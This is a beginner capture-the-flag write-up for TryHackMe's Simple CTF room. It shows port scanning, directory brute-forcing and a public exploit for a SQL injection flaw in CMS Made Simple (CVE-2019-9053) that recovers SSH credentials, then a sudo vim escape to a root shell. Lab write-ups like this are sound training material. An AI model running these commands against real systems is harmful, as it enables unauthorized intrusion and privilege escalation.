Write-up Simple CTF on TryHackMe

🎯 1. Introduction to the CTF

- 🧩 Name: Simple CTF on [TryHackMe](https://tryhackme.com/room/easyctf)
- 🎯 Goal: Practice basic penetration testing workflow:
    - Reconnaissance → Web Enumeration → Exploitation → SSH Access → Privilege Escalation → Get Flags
- Level: Beginner
- Tools Required: Kali Linux, Nmap, Gobuster, Python3, rockyou.txt, common dir wordlists
- TryHackMe Room Link: https://tryhackme.com/room/easyctf


🔍 2. Reconnaissance – Scanning the Target

📌 Step 2.1: Full Port Scan with Nmap

  ```bash
  nmap -p- --open -oN nmap_all.txt $IP
  ```

- p-: scan all 65535 ports
- -open: only show open ports
- oN: output to a file

Result:

Open ports → 21 (FTP), 80 (HTTP), 2222 (SSH - non-default)

📌 Step 2.2: Service and Version Detection

```bash
nmap -p21,80,2222 -sC -sV -oN nmap_detail.txt $IP
```

- sC: run default Nmap scripts (for banners, SSL info, etc.)
- sV: detect service versions

This gives us info like:

- FTP open (anonymous login: disabled)
- Web server running on port 80
- SSH open on port 2222


🌐 3. Web Enumeration – Discovering Hidden Paths

📌 Step 3.1: Directory Brute Force with Gobuster

```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

- u: target URL
- w: wordlist path

Result:

We find a hidden path → /simple

📌 Step 3.2: Investigate

/simple

- By checking the page and source code, we identify the CMS:
→ CMS Made Simple v2.2.8


💥 4. Exploitation – SQL Injection via CVE‑2019‑9053

📌 Step 4.1: Search for Exploits

- A quick Google search for
CMS Made Simple 2.2.8 exploit → leads to CVE-2019-9053
- It’s an unauthenticated blind SQL injection vulnerability

📌 Step 4.2: Run Exploit Script

We use a public PoC from [Exploit-DB](https://www.exploit-db.com/exploits/46635)

```bash
python3 46635.py -u http://$IP/simple --crack -w /usr/share/wordlists/rockyou.txt
```

- u: base URL to the vulnerable CMS
- -crack: attempt to crack the password hash
- w: specify a wordlist (rockyou.txt)

Result:

```notion
[+] Username: mitch
[+] Password: secret
```


🔐 5. SSH Access – Logging into the Box

```bash
ssh mitch@$IP -p 2222
```

- Use credentials: mitch / secret
- Successfully drops us into a shell as user mitch

📌 Step 5.1: Capture User Flag

```bash
cat user.txt
```

🟢 User Flag Found! Example:

```bash
flag{thm_user_flag_example}
```


🧨 6. Privilege Escalation – Gaining Root Access

📌 Step 6.1: Check sudo permissions

```bash
sudo -l
```

Result:

```bash
User mitch may run the following command on this host:
    (ALL) NOPASSWD: /usr/bin/vim
```

This means we can run vim as root without a password — classic misconfiguration.

📌 Step 6.2: Exploit vim to get root shell

```bash
sudo vim -c ':!/bin/bash'
```

- :! tells vim to run a shell command
- Since we’re running it with sudo, this opens a root shell

```bash
whoami
# root ✅
```

📌 Step 6.3: Read the Root Flag**

```bash
cat /root/root.txt
```

🟢 Root Flag Found! Example:

```bash
flag{thm_root_flag_example}
```


🏁 7. mmary of Flags* 
User: flag{thm_user_flag_example}
Root: lag{thm_root_flag_example}
